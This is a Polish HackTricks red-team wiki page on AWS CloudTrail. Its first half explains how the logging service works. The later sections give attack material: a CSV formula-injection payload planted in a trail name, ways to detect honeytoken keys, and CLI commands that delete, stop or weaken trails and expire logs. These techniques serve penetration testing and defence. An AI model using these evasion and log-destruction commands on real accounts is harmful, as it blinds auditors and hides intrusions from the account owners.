# AWS - CloudTrail Enum

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## **CloudTrail**

AWS CloudTrail **rejestruje i monitoruje aktywność w Twoim środowisku AWS**. Rejestruje szczegółowe **dzienniki zdarzeń**, w tym kto, co, kiedy i skąd, dla wszystkich interakcji z zasobami AWS. Zapewnia to ślad audytowy zmian i działań, pomagając w analizie bezpieczeństwa, audytowaniu zgodności i śledzeniu zmian zasobów. CloudTrail jest niezbędny do zrozumienia zachowań użytkowników i zasobów, poprawy postaw bezpieczeństwa oraz zapewnienia zgodności regulacyjnej.

Każde zarejestrowane zdarzenie zawiera:

* Nazwę wywołanego interfejsu API: `eventName`
* Wywołaną usługę: `eventSource`
* Czas: `eventTime`
* Adres IP: `SourceIPAddress`
* Metodę agenta: `userAgent`. Przykłady:
* Signing.amazonaws.com - Z konsoli zarządzania AWS
* console.amazonaws.com - Użytkownik główny konta
* lambda.amazonaws.com - AWS Lambda
* Parametry żądania: `requestParameters`
* Elementy odpowiedzi: `responseElements`

Zdarzenia są zapisywane w nowym pliku dziennika **około co 5 minut w pliku JSON**, są przechowywane przez CloudTrail i ostatecznie pliki dziennika są **dostarczane do S3 około 15 minut po**.\
Dzienniki CloudTrail mogą być **agregowane między kontami i między regionami**.\
CloudTrail pozwala na użycie **integralności pliku dziennika w celu weryfikacji, czy pliki dziennika pozostały niezmienione** od momentu dostarczenia ich przez CloudTrail. Tworzy on skrót SHA-256 dzienników w pliku z sumą kontrolną. Skrót sha-256 nowych dzienników jest tworzony co godzinę.\
Podczas tworzenia ścieżki selektory zdarzeń pozwolą określić, które zdarzenia mają być rejestrowane: zarządzanie, dane lub zdarzenia wniosków.

Dzienniki są zapisywane w wiadrze S3. Domyślnie używane jest szyfrowanie po stronie serwera (SSE-S3), więc AWS odszyfruje zawartość dla osób, które mają do niej dostęp, ale dla dodatkowego zabezpieczenia można użyć SSE z KMS i własnych kluczy.

Dzienniki są przechowywane w **wiadrze S3 o następującym formacie nazwy**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Gdzie BucketName to: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Przykład: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

W każdym folderze każdy dziennik będzie miał **nazwę zgodną z tym formatem**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konwencja Nazewnictwa Plików Dziennika

![](<../../../../.gitbook/assets/image (122).png>)

Ponadto **pliki skrótu (do sprawdzenia integralności pliku)** będą w **tym samym wiadrze** pod:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregowanie Dzienników z Wielu Kont

* Utwórz ścieżkę w koncie AWS, do którego chcesz dostarczyć pliki dziennika
* Zastosuj uprawnienia do docelowego wiadra S3, pozwalając na dostęp międzykontowy dla CloudTrail i zezwalając każdemu kontu AWS, które potrzebuje dostępu
* Utwórz nową ścieżkę w innych kontach AWS i wybierz utworzone wiadro w kroku 1

Jednak nawet jeśli możesz zapisać wszystkie dzienniki w tym samym wiadrze S3, nie możesz agregować dzienników CloudTrail z wielu kont do dzienników CloudWatch należących do jednego konta AWS.

{% hint style="danger" %}
Pamiętaj, że konto może mieć **różne ścieżki** z CloudTrail **włączone**, przechowujące te same (lub różne) dzienniki w różnych wiadrach.
{% endhint %}

### Cloudtrail ze wszystkich kont organizacji do 1

Podczas tworzenia CloudTrail można wskazać aktywowanie cloudtrail dla wszystkich kont w organizacji i uzyskanie dzienników tylko do 1 wiadra:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

W ten sposób łatwo można skonfigurować CloudTrail we wszystkich regionach wszystkich kont i skoncentrować dzienniki w 1 koncie (które należy chronić).

### Sprawdzanie Plików Dziennika

Możesz sprawdzić, czy dzienniki nie zostały zmienione, uruchamiając

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Dzienniki do CloudWatch

**CloudTrail może automatycznie wysyłać dzienniki do CloudWatch, dzięki czemu możesz ustawić alerty, które ostrzegą Cię, gdy podejrzane działania zostaną wykonane.**\
Zauważ, że aby umożliwić CloudTrailowi wysyłanie dzienników do CloudWatch, musi zostać utworzona **rola**, która pozwala na to działanie. Jeśli to możliwe, zaleca się używanie domyślnej roli AWS do wykonania tych działań. Rola ta umożliwi CloudTrailowi:

* CreateLogStream: Pozwala na tworzenie strumieni dzienników CloudWatch Logs
* PutLogEvents: Dostarcza dzienniki CloudTrail do strumienia dzienników CloudWatch Logs

### Historia zdarzeń

Historia zdarzeń CloudTrail pozwala na sprawdzenie w tabeli dzienników, które zostały zarejestrowane:

![](<../../../../.gitbook/assets/image (89).png>)

### Wnioski

**Wnioski CloudTrail** automatycznie **analizują** zdarzenia zarządzania zapisami z szlaków CloudTrail i **ostrzegają** Cię o **nietypowej aktywności**. Na przykład, jeśli wystąpi wzrost zdarzeń `TerminateInstance`, który różni się od ustalonych bazelinów, zobaczysz to jako zdarzenie Wniosku. Te zdarzenia ułatwiają **znalezienie i reagowanie na nietypową aktywność interfejsu API** bardziej niż kiedykolwiek.

Wnioski są przechowywane w tym samym kubełku co dzienniki CloudTrail w: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Bezpieczeństwo

| Integralność plików dziennika CloudTrail | <ul><li>Sprawdź, czy dzienniki nie zostały sfałszowane (zmodyfikowane lub usunięte)</li><li><p>Używa plików skrótu (tworzy skrót dla każdego pliku)</p><ul><li>Haszowanie SHA-256</li><li>SHA-256 z RSA do podpisywania cyfrowego</li><li>klucz prywatny należący do Amazon</li></ul></li><li>Tworzenie pliku skrótu trwa 1 godzinę (wykonywane o pełnej godzinie co godzinę)</li></ul> |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Zatrzymaj nieautoryzowany dostęp         | <ul><li><p>Użyj polityk IAM i polityk kubełka S3</p><ul><li>Zespół ds. bezpieczeństwa —> dostęp admina</li><li>Audytorzy —> dostęp tylko do odczytu</li></ul></li><li>Użyj SSE-S3/SSE-KMS do szyfrowania dzienników</li></ul>                                                                                                                                        |
| Zapobiegaj usuwaniu plików dziennika      | <ul><li>Ogranicz dostęp do usuwania za pomocą polityk IAM i kubełka</li><li>Skonfiguruj usuwanie S3 MFA</li><li>Sprawdź za pomocą Walidacji pliku dziennika</li></ul>                                                                                                                                                                                            |

## Doradca dostępu

Doradca dostępu AWS polega na ostatnich 400 dniach dzienników AWS **CloudTrail, aby zgromadzić swoje wnioski**. CloudTrail rejestruje historię wywołań interfejsu API AWS i związanych z nimi zdarzeń wykonanych w koncie AWS. Doradca dostępu wykorzystuje te dane do **pokazania, kiedy usługi były ostatnio używane**. Analizując dzienniki CloudTrail, Doradca dostępu może określić, które usługi AWS zostały użyte przez użytkownika IAM lub rolę i kiedy to nastąpiło. Pomaga to administratorom AWS podejmować świadome decyzje dotyczące **dostosowywania uprawnień**, ponieważ mogą zidentyfikować usługi, które nie były używane przez długi czas i potencjalnie ograniczyć zbyt szerokie uprawnienia na podstawie rzeczywistych wzorców użycia.

{% hint style="success" %}
Dlatego Doradca dostępu informuje o **nadmierne przyznawane uprawnienia użytkownikom**, aby administrator mógł je usunąć
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Działania

### Wyliczanie
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Wstrzyknięcie CSV**

Istnieje możliwość wykonania wstrzyknięcia CSV w CloudTrail, które wykona arbitralny kod, jeśli dzienniki zostaną wyeksportowane do formatu CSV i otwarte w programie Excel.\
Następujący kod wygeneruje wpis dziennika z nazwą ścieżki zawierającą ładunek:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Dla więcej informacji na temat Wstrzykiwań CSV sprawdź stronę:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Dla bardziej szczegółowych informacji na temat tej konkretnej techniki sprawdź [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Ominięcie Wykrywania**

### Ominięcie **HoneyTokens**

Honeytokens są tworzone w celu **wykrywania wycieku wrażliwych informacji**. W przypadku AWS są to **klucze AWS, których użycie jest monitorowane**, jeśli coś wyzwala akcję z tym kluczem, to ktoś musiał ukraść ten klucz.

Jednakże, Honeytokens takie jak te stworzone przez [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) używają rozpoznawalnej nazwy konta lub tego samego identyfikatora konta AWS dla wszystkich swoich klientów. Dlatego, jeśli możesz uzyskać nazwę konta i/lub identyfikator konta bez spowodowania utworzenia jakiegokolwiek logu przez Cloudtrail, **możesz dowiedzieć się, czy klucz jest honeytokenem czy nie**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) ma pewne reguły, aby wykryć, czy klucz należy do [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Jeśli **`canarytokens.org`** pojawia się w nazwie roli lub identyfikatorze konta **`534261010715`** pojawia się w komunikacie błędu.
* Testując je bardziej niedawno, używają konta **`717712589309`** i wciąż mają ciąg **`canarytokens.com`** w nazwie.
* Jeśli **`SpaceCrab`** pojawia się w nazwie roli w komunikacie błędu
* **SpaceSiren** używa **uuids** do generowania nazw użytkowników: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Jeśli **nazwa wygląda jak losowo wygenerowana**, istnieje duże prawdopodobieństwo, że jest to HoneyToken.

#### Pobierz identyfikator konta z identyfikatora klucza

Możesz uzyskać **Identyfikator Konta** z **zakodowanego** wewnątrz **klucza dostępu** jak [**wyjaśniono tutaj**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i sprawdzić identyfikator konta na liście kont AWS Honeytokens:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Sprawdź więcej informacji w [**oryginalnym badaniu**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Nie generuj logu

Najbardziej skuteczną techniką jest tak naprawdę prosta. Po prostu użyj klucza, który właśnie znalazłeś, aby uzyskać dostęp do jakiejś usługi wewnątrz swojego własnego konta atakującego. Spowoduje to, że **CloudTrail wygeneruje log w TWOIM WŁASNYM koncie AWS, a nie w koncie ofiary**.

Rzecz w tym, że wynik pokaże błąd wskazujący identyfikator konta i nazwę konta, więc **będziesz w stanie sprawdzić, czy to jest Honeytoken**.

#### Usługi AWS bez logów

W przeszłości były pewne **usługi AWS, które nie wysyłały logów do CloudTrail** (znajdź [listę tutaj](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Niektóre z tych usług będą **odpowiadać** błędem zawierającym **ARN roli klucza**, jeśli ktoś nieautoryzowany (klucz honeytoken) spróbuje uzyskać do niej dostęp.

W ten sposób **atakujący może uzyskać ARN klucza bez wywoływania żadnego logu**. W ARN atakujący może zobaczyć **identyfikator konta AWS i nazwę**, łatwo jest poznać identyfikatory i nazwy kont firm HoneyToken, w ten sposób atakujący może zidentyfikować, czy token jest HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Zauważ, że wszystkie publiczne interfejsy API, które okazały się nie tworzyć logów CloudTrail, zostały teraz naprawione, więc być może będziesz musiał znaleźć swoje...

Aby uzyskać więcej informacji, sprawdź [**oryginalne badanie**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Dostęp do trzeciej infrastruktury

Pewne usługi AWS będą **tworzyć pewną infrastrukturę**, taką jak **Bazy danych** lub **klastry Kubernetes** (EKS). Użytkownik **bezpośrednio komunikujący się z tymi usługami** (takimi jak interfejs API Kubernetes) **nie będzie korzystał z interfejsu API AWS**, więc CloudTrail nie będzie w stanie zobaczyć tej komunikacji.

Dlatego użytkownik mający dostęp do EKS, który odkrył adres URL interfejsu API EKS, mógłby lokalnie wygenerować token i **komunikować się bezpośrednio z usługą API, nie zostając wykrytym przez CloudTrail**.

Więcej informacji w:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modyfikowanie konfiguracji CloudTrail

#### Usuwanie ścieżek
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zatrzymaj ścieżki
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Wyłącz logowanie wieloregionowe

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Wyłączanie logowania za pomocą selektorów zdarzeń

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

W pierwszym przykładzie pojedynczy selektor zdarzeń jest podany jako tablica JSON z pojedynczym obiektem. `"ReadWriteType": "ReadOnly"` oznacza, że **selektor zdarzeń powinien rejestrować tylko zdarzenia tylko do odczytu** (więc CloudTrail insights **nie będą sprawdzać zdarzeń zapisu** na przykład).

Możesz dostosować selektor zdarzeń w zależności od swoich konkretnych wymagań.

#### Usuwanie logów za pomocą polityki cyklu życia S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modyfikowanie konfiguracji kubełka

* Usuń kubełek S3
* Zmień politykę kubełka, aby odrzucić wszelkie zapisy z usługi CloudTrail
* Dodaj politykę cyklu życia do kubełka S3 w celu usuwania obiektów
* Wyłącz klucz KMS używany do szyfrowania logów CloudTrail

### Ransomware CloudTrail

#### Ransomware S3

Możesz **wygenerować klucz asymetryczny** i sprawić, że **CloudTrail zaszyfruje dane** tym kluczem i **usunąć klucz prywatny**, aby zawartość CloudTrail nie mogła zostać odzyskana.\
To jest w zasadzie **ransomware S3-KMS** wyjaśniony w:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

To jest najprostszy sposób wykonania poprzedniego ataku z różnymi wymaganiami uprawnień:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencje**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
